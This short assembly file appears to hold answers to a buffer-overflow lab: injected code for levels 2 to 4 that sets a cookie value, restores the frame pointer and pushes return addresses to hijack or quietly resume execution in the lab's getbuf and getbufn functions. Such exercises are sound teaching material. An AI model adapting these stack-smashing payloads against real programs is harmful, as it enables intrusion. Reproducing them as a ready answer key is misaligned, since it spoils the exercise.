/*level 2*/
mov $0x7f2e79d0, %eax /*move cookie to %eax*/
mov %eax, 0x804d10c  /*set global_value as cookie*/
push $0x8048d52      /*push the address of bang to the stack*/
ret                  /*goto bang*/

/*level 3*/
mov $0x7f2e79d0, %eax /*move cookie to %eax for returning*/
mov $0x55683160, %ebp /*recover the old %ebp*/
push $0x8048e50      /*push the address of the original rtn-addr of getbuf to the stack*/
ret                  /*return back as if nothing happens*/

/*level 4*/
mov  $0x7f2e79d0, %eax /*move cookie to %eax for returning*/
leal 0x28(%esp), %ebp /*recover the old %ebp*/
push $0x8048ce2       /*push the address of the original rtn-addr of getbufn to the stack*/
ret                   /*return back as if nothing happens*/
